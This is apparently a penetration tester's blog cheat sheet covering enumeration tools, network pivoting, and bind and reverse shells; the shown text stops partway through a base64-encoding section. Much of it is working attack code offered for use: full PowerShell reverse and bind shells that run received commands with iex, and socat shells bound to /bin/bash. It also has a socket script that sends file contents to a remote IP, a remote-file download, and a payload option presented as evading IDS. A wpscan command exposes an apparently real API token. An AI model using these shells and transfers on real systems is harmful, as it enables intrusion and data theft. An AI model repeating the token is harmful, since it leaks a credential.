<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>Pentester's Toolbox | Vithurshan SELVARAJAH</title><link rel=stylesheet href=/css/style.css><link rel=stylesheet href=/css/fonts.css></head><body><nav><ul class=menu><li><a href=/>Home</a></li><li><a href=/notes/>Notebook</a></li><li><a href=/categories/>Categories</a></li><li><a href=/projects/>Projects</a></li><li><a href=/index.xml>RSS</a></li></ul><hr></nav><div class=article-meta><h1><span class=title>Pentester&rsquo;s Toolbox</span></h1><h2 class=date>2023/10/27</h2></div><main><div id=outline-container-headline-1 class=outline-2><h2 id=headline-1>Table of Content&#160;&#160;&#160;<span class=tags><span>toc</span></span></h2><div id=outline-text-headline-1 class=outline-text-2><ul><li><p><a href=#1-web-enumeration>1. Web Enumeration</a></p><ul><li><a href=#11-feroxbuster>1.1. Feroxbuster</a></li><li><a href=#12-wfuzz>1.2. Wfuzz</a></li><li><a href=#13-whatweb>1.3. Whatweb</a></li><li><a href=#14-wpscan>1.4. WPScan</a></li></ul></li><li><p><a href=#2-network-pivot>2. Network Pivot</a></p><ul><li><a href=#21-ligolo-ng>2.1. Ligolo-ng</a></li></ul></li><li><p><a href=#3-bind-shell--reverse-shell--file-transfer>3. Bind Shell | Reverse Shell | File Transfer</a></p><ul><li><a href=#31-powercat>3.1. Powercat</a></li><li><a href=#32-socat>3.2. Socat</a></li><li><a href=#33-powershell>3.3. Powershell</a></li></ul></li><li><p><a href=#4-remote-shell-on-windows>4. Remote Shell on Windows</a></p><ul><li><a href=#41-impacket-wmiexec>4.1. Impacket-wmiexec</a></li><li><a href=#42-impacket-psexec>4.2. Impacket-psexec</a></li><li><a href=#43-evil-winrm>4.3. Evil-winrm</a></li><li><a href=#44-enter-pssession>4.4. Enter-PSSession</a></li><li><a href=#45-pywinrm>4.5. Pywinrm</a></li></ul></li><li><p><a href=#5-passwords-extraction>5. Passwords Extraction</a></p><ul><li><a href=#51-mimikatz>5.1. Mimikatz</a></li><li><a href=#52-impacket-secretsdump>5.2. Impacket-secretsdump</a></li></ul></li><li><p><a href=#6-linux-privilege-escalation>6. Linux Privilege Escalation</a></p><ul><li><a href=#61-linenum---linux-privesc>6.1. LinEnum - Linux PrivEsc</a></li><li><a href=#62-linpeas---linux-privesc>6.2. LinPEAS - Linux PrivEsc</a></li><li><a href=#63-unix-privesc-check---linux-privesc>6.3. unix-privesc-check - Linux PrivEsc</a></li><li><a href=#64-pspy>6.4. Pspy</a></li></ul></li><li><p><a href=#7-windows-enumeration>7. Windows Enumeration</a></p><ul><li><a href=#71-netexe>7.1 NET.exe</a></li><li><a href=#72-psloggedon>7.2. PsLoggedon</a></li><li><a href=#73-windows-privilege-escalation>7.3. Windows Privilege Escalation</a></li></ul></li><li><p><a href=#8-ad-enumeration>8. AD Enumeration</a></p><ul><li><a href=#81-powerview>8.1. PowerView</a></li><li><a href=#82-sharphound>8.2. SharpHound</a></li><li><a href=#83-bloodhound>8.3. BloodHound</a></li></ul></li><li><p><a href=#9-active-information-gathering>9. Active Information Gathering</a></p><ul><li><a href=#91-dns-enumeration>9.1. DNS Enumeration</a></li><li><a href=#92-port-scanning>9.2. Port Scanning</a></li><li><a href=#93-smb-enumeration>9.3. SMB Enumeration</a></li><li><a href=#94-smtp-enumeration>9.4. SMTP Enumeration</a></li><li><a href=#95-snmp-enumeration>9.5. SNMP Enumeration</a></li><li><a href=#96-nfs-enumeration>9.6. NFS Enumeration</a></li></ul></li><li><p><a href=#10-miscellaneous>10. Miscellaneous</a></p><ul><li><a href=#101-pdftotext>10.1. Pdftotext</a></li><li><a href=#102-awk>10.2. AWK</a></li></ul></li><li><a href=#11-footnotes>11. Footnotes</a></li></ul></div></div><div id=outline-container-headline-2 class=outline-2><h2 id=headline-2>1. Web Enumeration</h2><div id=outline-text-headline-2 class=outline-text-2><div id=outline-container-headline-3 class=outline-3><h3 id=headline-3>1.1. Feroxbuster</h3><div id=outline-text-headline-3 class=outline-text-3><p>Search for web pages with <code class=verbatim>.js</code> and <code class=verbatim>.htlm</code> extension and the default wordlist will be used:</p><div class="src src-shell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>  feroxbuster -u http://127.0.0.1 -x js,html</span></span></code></pre></div></div></div></div><div id=outline-container-headline-4 class=outline-3><h3 id=headline-4>1.2. Wfuzz</h3><div id=outline-text-headline-4 class=outline-text-3><p>Wfuzz will replace the placeholder in the provided URL with the words from the wordlist.</p></div></div><div id=outline-container-headline-5 class=outline-3><h3 id=headline-5>1.3. Whatweb</h3><div id=outline-text-headline-5 class=outline-text-3><p>Identify the technology stack has been used to build the website:</p><div class="src src-shell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>  whatweb http://192.168.5.244</span></span></code></pre></div></div></div></div><div id=outline-container-headline-6 class=outline-3><h3 id=headline-6>1.4. WPScan</h3><div id=outline-text-headline-6 class=outline-text-3><p>WPScan WordPress security scanner.</p><p>Enumerate WordPress plugins vulnerabilities by providing an API key:</p><div class="src src-shell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>  wpscan --enumerate vp --plugins-detection aggressive --url http://atomicl.net/ --api-token hmn5HXmlipsaYHcvAjv1N1t1HEMvW4AOtMSzXUO0FJI</span></span></code></pre></div></div><ul><li><code class=verbatim>--enumerate vp</code> WPScan can enumerate various things from WordPress site, such as themes, usernames, Timthumb files and more. Here we are scanning only vulnerable plugins.</li><li><code class=verbatim>--plugins-detection</code> Speed of the plugin scan.</li></ul></div></div></div></div><div id=outline-container-headline-7 class=outline-2><h2 id=headline-7>2. Network Pivot</h2><div id=outline-text-headline-7 class=outline-text-2><div id=outline-container-headline-8 class=outline-3><h3 id=headline-8>2.1. Ligolo-ng</h3><div id=outline-text-headline-8 class=outline-text-3><p><code>Ligolo-ng</code> establishes tunnels from a reverse TCP/TLS connection using a tun interface (without the need of SOCKS).</p><div id=outline-container-headline-9 class=outline-4><h4 id=headline-9>2.1.1. Configure Proxy Server and Client</h4><div id=outline-text-headline-9 class=outline-text-4><ol><li><p>When using on Linux as Proxy Server, we need to create a tun interface:</p><div class="src src-shell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>  sudo ip tuntap add user <span style=color:#66d9ef>$(</span>whoami<span style=color:#66d9ef>)</span> mode tun ligolo
</span></span><span style=display:flex><span>  sudo ip link set ligolo up</span></span></code></pre></div></div></li><li><p>Then add the routes to which traffic should be forwarded from the proxy server:</p><div class="src src-shell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>  sudo ip route add 192.168.216.0/24 dev ligolo</span></span></code></pre></div></div></li><li><p>Then we can start the proxy server (default port 11601):</p><div class="src src-shell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>  ./ligolo-ng_proxy_0.4.4_linux -selfcert</span></span></code></pre></div></div><ul><li><code class=verbatim>-selfcert</code> The proxy server automatically generates self-signed TLS certificates.</li></ul></li><li><p>Start the agent on your target (victim) computer (no privileges are required):</p><div class="src src-powershell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>  .\ligolo_agent.exe -connect 192.168.45.49<span style=color:#960050;background-color:#1e0010>:</span>11601 -ignore-cert</span></span></code></pre></div></div><ul><li><code class=verbatim>-ignore-cert</code> Agent will not check certificate.</li></ul></li><li><p>Back to proxy server and start session in order to forward traffic to reverse TCP connection:</p><div class="src src-text"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>  session &lt;session id&gt;
</span></span><span style=display:flex><span>  start</span></span></code></pre></div></div></li><li><p>Then verify that traffic is forwarded through the tunnel created from a reverse TCP/TLS connection:</p><div class="src src-shell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>  crackmapexec smb 192.168.216.0/24</span></span></code></pre></div></div></li></ol></div></div><div id=outline-container-headline-10 class=outline-4><h4 id=headline-10>2.1.2. Accessing the Proxy Server Network from Proxy Client</h4><div id=outline-text-headline-10 class=outline-text-4><p>Type the following command on Ligolo proxy to create a listener on agent which forward the traffic that received on a particular port to Ligolo proxy server on the specified port:</p><div class="src src-text"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>  listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4444</span></span></code></pre></div></div><ul><li><code class=verbatim>--addr 0.0.0.0:1234</code> Create listener on port 1234 that listen on all interface available on Ligolo agent.</li><li><code class=verbatim>--to 127.0.0.1:4444</code> Once received the traffic from Ligolo agent, forward it to specified IP address and port.</li></ul><p>Check the previously created listener:</p><div class="src src-text"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>  listener_list</span></span></code></pre></div></div></div></div></div></div></div></div><div id=outline-container-headline-11 class=outline-2><h2 id=headline-11>3. Bind Shell | Reverse Shell | File Transfer</h2><div id=outline-text-headline-11 class=outline-text-2><div id=outline-container-headline-12 class=outline-3><h3 id=headline-12>3.1. Powercat</h3><div id=outline-text-headline-12 class=outline-text-3><p>Netcat implementation in PowerShell.</p><div id=outline-container-headline-13 class=outline-4><h4 id=headline-13>3.1.1. File Transfers</h4><div id=outline-text-headline-13 class=outline-text-4><p>Server:</p><div class="src src-shell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>  sudo nc -lnvp <span style=color:#ae81ff>443</span> &gt; receiving_powercat.ps1</span></span></code></pre></div></div><p>Client:</p><div class="src src-powershell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>    powercat -c 10.10.0.4 -p 443 -i C:\Users\Public\powercat.ps1</span></span></code></pre></div></div><ul><li><code class=verbatim>-i</code> Indicates local file that will be transfer to netcat listener.</li></ul></div></div><div id=outline-container-headline-14 class=outline-4><h4 id=headline-14>3.1.2. Reverse Shells</h4><div id=outline-text-headline-14 class=outline-text-4><p>Server:</p><div class="src src-shell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>  sudo nc -lvp <span style=color:#ae81ff>443</span></span></span></code></pre></div></div><p>Client:</p><div class="src src-powershell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>  powercat -c 10.10.0.4 -p 443 -e cmd.exe</span></span></code></pre></div></div></div></div><div id=outline-container-headline-15 class=outline-4><h4 id=headline-15>3.1.3. Bind Shells</h4><div id=outline-text-headline-15 class=outline-text-4><p>Server:</p><div class="src src-powershell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>  powercat -l -p 443 -e cmd.exe</span></span></code></pre></div></div><p>Client:</p><div class="src src-shell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>  nc 10.10.0.22 <span style=color:#ae81ff>443</span></span></span></code></pre></div></div></div></div><div id=outline-container-headline-16 class=outline-4><h4 id=headline-16>3.1.4. Generate Stand-Alone Payloads</h4><div id=outline-text-headline-16 class=outline-text-4><p>Server:</p><div class="src src-shell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>  sudo nc -lvp <span style=color:#ae81ff>443</span></span></span></code></pre></div></div><p>This command will create Powershell script that can be used without Powercat (hence the name stand-alone) to send reverse shell to a listener <code class=verbatim>10.10.0.4</code> on port <code class=verbatim>443</code>:</p><div class="src src-powershell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>  powercat -c 10.10.0.4 -p 443 -e cmd.exe -g &gt; reverseshell.ps1</span></span></code></pre></div></div><p>Client:</p><div class="src src-powershell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>  powercat -c 10.10.0.4 -p 443 -e cmd.exe <span style=color:#f92672>-ge</span> &gt; encodedreverseshell.ps1</span></span></code></pre></div></div><ul><li><code class=verbatim>-e</code> Create a stand-alone script in base64 format which prevent from detecting by IDS.</li></ul></div></div></div></div><div id=outline-container-headline-17 class=outline-3><h3 id=headline-17>3.2. <a href=http://www.dest-unreach.org/socat/>Socat</a></h3><div id=outline-text-headline-17 class=outline-text-3><div id=outline-container-headline-18 class=outline-4><h4 id=headline-18>3.2.1. Chat using Socat</h4><div id=outline-text-headline-18 class=outline-text-4><p>Server side - Redirect STDOUT to client on port 443</p><div class="src src-shell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>  sudo socat TCP4-LISTEN:443 STDOUT</span></span></code></pre></div></div><p>Client side</p><div class="src src-shell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>  socat - TCP4:&lt;remote server<span style=color:#960050;background-color:#1e0010>&#39;</span>s ip address&gt;:80</span></span></code></pre></div></div></div></div><div id=outline-container-headline-19 class=outline-4><h4 id=headline-19>3.2.2. File Transfers</h4><div id=outline-text-headline-19 class=outline-text-4><p>Server side:</p><div class="src src-shell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>  sudo socat TCP4-LISTEN:443,fork file:secret.txt</span></span></code></pre></div></div><ul><li><code class=verbatim>TCP4-LISTEN</code> Specifies an IPv4 listener</li><li><code class=verbatim>fork</code> Creates a child process once a connection is made by a client to allow multiple connections.</li><li><code class=verbatim>file</code> File to be transferred.</li></ul><p>Client side:</p><div class="src src-shell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>  socat TCP4:10.10.0.4:443 file:received_passwords.txt,create</span></span></code></pre></div></div><ul><li><code class=verbatim>create</code> Create a new file.</li></ul></div></div><div id=outline-container-headline-20 class=outline-4><h4 id=headline-20>3.2.3. Reverse shell</h4><div id=outline-text-headline-20 class=outline-text-4><p>Server side:</p><div class="src src-text"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>  socat -d -d TCP4-LISTEN:443 STDOUT</span></span></code></pre></div></div><ul><li><code class=verbatim>-d -d</code> Increase verbosity</li></ul><p>Client side:</p><div class="src src-shell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>  socat TCP4:10.10.0.22:443 EXEC:/bin/bash</span></span></code></pre></div></div></div></div><div id=outline-container-headline-21 class=outline-4><h4 id=headline-21>3.2.4. Encrypted Bind Shell</h4><div id=outline-text-headline-21 class=outline-text-4><p>Server side
Use tls to encrypt bind shell connections by creating a self-signed certificate.</p><div class="src src-shell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>  openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days <span style=color:#ae81ff>362</span> -out bind_shell.crt</span></span></code></pre></div></div><ul><li><code class=verbatim>req</code> Initiate a new certificate signing request</li><li><code class=verbatim>-newkey</code> Generate a new private key</li><li><code class=verbatim>rsa:2048</code> Use RSA encryption with a 2,048-bit key length.</li><li><code class=verbatim>-nodes</code> Store the private key without passphrase protection</li><li><code class=verbatim>-keyout</code> Save the key to a file</li><li><code class=verbatim>-x509</code> Output a self-signed certificate instead of a certificate request</li><li><code class=verbatim>-days</code> Set validity period in days</li><li><code class=verbatim>-out</code> Save the certificate to a file</li></ul><p>Once certificate created convert it to a format socat accepts :</p><div class="src src-shell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>  cat bind_shell.key bind_shell.crt &gt; bind_shell.pem</span></span></code></pre></div></div><p>Create a listener :</p><div class="src src-text"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>  sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash</span></span></code></pre></div></div><ul><li><code class=verbatim>verify</code> Disable SSL verification.</li><li><code class=verbatim>fork</code> Spawn a child process once a connection is established.</li></ul><p>Client side</p><div class="src src-text"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>  socat - OPENSSL:10.11.0.4:443,verify=0</span></span></code></pre></div></div><ul><li><code class=verbatim>-</code> Transfer STDIO to remote host</li><li><code class=verbatim>OPENSSL</code> Establish a remote SSL connection</li></ul></div></div></div></div><div id=outline-container-headline-22 class=outline-3><h3 id=headline-22>3.3. Powershell</h3><div id=outline-text-headline-22 class=outline-text-3><p>Change execution policy of Powershell in order to execute scripts, run the command as administrator in Powershell:</p><div class="src src-powershell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>  Set-ExecutionPolicy Unrestricted</span></span></code></pre></div></div><p>OR:</p><div class="src src-powershell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>  Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser</span></span></code></pre></div></div><div id=outline-container-headline-23 class=outline-4><h4 id=headline-23>3.3.1. File Transfers [Download files]</h4><div id=outline-text-headline-23 class=outline-text-4><div class="src src-powershell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>  powershell -c <span style=color:#e6db74>&#34;(new-object System.Net.WebClient).DownloadFile(&#39;http://10.11.0.4/wget.exe&#39;,&#39;C:\Users\Public\Desktop\wget.exe&#39;)&#34;</span></span></span></code></pre></div></div><ul><li><code class=verbatim>-c</code>: run the command inside double quotes in Powershell.</li><li><code class=verbatim>new-object</code>: this cmdlet instantiate .Net Framework or a COM object. The above command will create an instance of the WebClient class.</li><li><code class=verbatim>WebClient</code>: This class is used to access resources identified by a URI which is implemented in the <code>System.Net</code> namespace.</li><li><code class=verbatim>DownloadFile</code>: Methode defined in WebClient class which download the remote data.</li></ul><p>Refer to the Microsoft <a href="https://learn.microsoft.com/en-us/dotnet/api/system.net?view=netframework-4.7.2">System.Net reference</a>, to see the list of all of the implemented classes and follow through to the WebClient class to visualize the structure of classes and methods used in the above command.</p></div></div><div id=outline-container-headline-24 class=outline-4><h4 id=headline-24>3.3.2. File Transfer - [Upload a file]</h4><div id=outline-text-headline-24 class=outline-text-4><p>Netcat listen on port 443 and pipe the output to <code class=verbatim>base64</code> to decode the received data:</p><div class="src src-shell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>  nc -nvlp <span style=color:#ae81ff>4446</span> | base64 --decode &gt; test.zip</span></span></code></pre></div></div><p>On Windows, send the file data in base64 encoded format to Netcat listener:</p><div class="src src-powershell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>$encoded_data=<span style=color:#66d9ef>[System.Convert]</span>::ToBase64String(<span style=color:#66d9ef>[io.file]</span>::ReadAllBytes(<span style=color:#e6db74>&#34;C:\users\Public\Downloads\test.zip&#34;</span>));
</span></span><span style=display:flex><span><span style=color:#75715e># Or read the entire file to an array of bytes.</span>
</span></span><span style=display:flex><span><span style=color:#75715e># $bytes = [System.IO.File]::ReadAllBytes(&#34;C:\users\Public\mess.txt&#34;)</span>
</span></span><span style=display:flex><span>$socket = New-Object net.sockets.tcpclient(<span style=color:#e6db74>&#39;192.168.45.188&#39;</span>,4446);
</span></span><span style=display:flex><span>$stream = $socket.GetStream();
</span></span><span style=display:flex><span>$writer = new-object System.IO.StreamWriter($stream);
</span></span><span style=display:flex><span>$writer.WriteLine($encoded_data);
</span></span><span style=display:flex><span>$writer.flush();
</span></span><span style=display:flex><span>$socket.close();</span></span></code></pre></div></div></div></div><div id=outline-container-headline-25 class=outline-4><h4 id=headline-25>3.3.3. Reverse Shells</h4><div id=outline-text-headline-25 class=outline-text-4><p>Set a listener to receive a reverse shell from Windows machine using Powershell:</p><div class="src src-shell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>  sudo nc -lnvp <span style=color:#ae81ff>443</span></span></span></code></pre></div></div><p>Send reverse shell using Powershell to Netcat listener:</p><div class="src src-powershell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>  $client = New-Object System.Net.Sockets.TCPClient(<span style=color:#e6db74>&#39;192.168.1.20&#39;</span>,443);
</span></span><span style=display:flex><span>  $stream = $client.GetStream();
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>[byte[]]</span>$bytes = 0..65535|%{0};
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>while</span>(($i = $stream.Read($bytes, 0, $bytes.Length)) <span style=color:#f92672>-ne</span> 0)
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>      $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
</span></span><span style=display:flex><span>      $sendback = (iex $data 2&gt;&amp;1 | Out-String );
</span></span><span style=display:flex><span>      $sendback2 = $sendback + <span style=color:#e6db74>&#39;PS &#39;</span> + (pwd).Path + <span style=color:#e6db74>&#39;&gt; &#39;</span>;
</span></span><span style=display:flex><span>      $sendbyte = (<span style=color:#66d9ef>[text.encoding]</span>::ASCII).GetBytes($sendback2);
</span></span><span style=display:flex><span>      $stream.Write($sendbyte,0,$sendbyte.Length);
</span></span><span style=display:flex><span>      $stream.Flush();
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  $client.Close();</span></span></code></pre></div></div><p>An important command that we use to execute received command is <code class=verbatim>iex</code>, which is an alias of cmdlet <code class=verbatim>Invoke-Expression</code>.</p><p>Send a reverse shell using Powershell one-liner:</p><div class="src src-powershell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>$client = New-Object System.Net.Sockets.TCPClient(<span style=color:#e6db74>&#39;192.168.1.20&#39;</span>,80);$stream = $client.GetStream();<span style=color:#66d9ef>[byte[]]</span>$bytes = 0..65535|%{0};<span style=color:#66d9ef>while</span>(($i = $stream.Read($bytes, 0, $bytes.Length)) <span style=color:#f92672>-ne</span> 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + <span style=color:#e6db74>&#39;PS &#39;</span> + (pwd).Path + <span style=color:#e6db74>&#39;&gt; &#39;</span>;$sendbyte = (<span style=color:#66d9ef>[text.encoding]</span>::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush();}$client.Close();</span></span></code></pre></div></div></div></div><div id=outline-container-headline-26 class=outline-4><h4 id=headline-26>3.3.4. Bind Shells</h4><div id=outline-text-headline-26 class=outline-text-4><div class="src src-powershell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>  $listener = New-Object System.Net.Sockets.TcpListener(<span style=color:#e6db74>&#39;0.0.0.0&#39;</span>,443);
</span></span><span style=display:flex><span>  $listener.start();
</span></span><span style=display:flex><span>  $client = $listener.AcceptTcpClient();
</span></span><span style=display:flex><span>  $stream = $client.GetStream();
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>[byte[]]</span>$bytes = 0..65535|%{0};
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>while</span>(($i = $stream.Read($bytes, 0, $bytes.Length)) <span style=color:#f92672>-ne</span> 0)
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>      $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
</span></span><span style=display:flex><span>      $sendback = (iex $data 2&gt;&amp;1 | Out-String );
</span></span><span style=display:flex><span>      $sendback2  = $sendback + <span style=color:#e6db74>&#39;PS &#39;</span> + (pwd).Path + <span style=color:#e6db74>&#39;&gt; &#39;</span>;
</span></span><span style=display:flex><span>      $sendbyte = (<span style=color:#66d9ef>[text.encoding]</span>::ASCII).GetBytes($sendback2);
</span></span><span style=display:flex><span>      $stream.Write($sendbyte,0,$sendbyte.Length);
</span></span><span style=display:flex><span>      $stream.Flush()
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  $client.Close();
</span></span><span style=display:flex><span>  $listener.Stop()</span></span></code></pre></div></div><p>This time we create new listener variable that uses the System.Net.Sockets.TcpListener class, make listening on all network interface using 0.0.0.0 and on port 443. Then this Powershell code executes received data as command using iex.</p></div></div><div id=outline-container-headline-27 class=outline-4><h4 id=headline-27>3.3.5. Encode to Base64</h4><div id=outline-text-headline-27 class=outline-text-4><div id=outline-container-headline-28 class=outline-5><h5 id=headline-28>3.3.5.1. Encode PS Script</h5><div id=outline-text-headline-28 class=outline-text-5><div class="src src-powershell"><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>$Reverse_shell = <span style=color:#e6db74>@&#39;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>$client = New-Object System.Net.Sockets.TCPClient(&#39;192.168.1.20&#39;,4433);
</span></span></span><span style=display:flex><span><span style=color:#e6db74>$stream = $client.GetStream();
</span></span></span><span style=display:flex><span><span style=color:#e6db74>[byte[]]$bytes = 0..65535|%{0};
</span></span></span><span style=display:flex><span><span style=color:#e6db74>while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){                                                                                                                                                                    
</span></span></span><span style=display:flex><span><span style=color:#e6db74>$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
</span></span></span><span style=display:flex><span><span style=color:#e6db74>$sendback = (iex $data 2&gt;&amp;1 | Out-String );
</span></span></span><span style=display:flex><span><span style=color:#e6db74>$sendback2 = $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
</span></span></span><span style=display:flex><span><span style=color:#e6db74>$stream.Write($sendbyte,0,$sendbyte.Length);
</span></span></span><span style=display:flex><span><span style=color:#e6db74>$stream.Flush()}                                                                                                           
</span></span></span><span style=display:flex><span><span style=color:#e6db74>$client.Close();
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&#39;@</span>
</span></span><span style=display:flex><span>
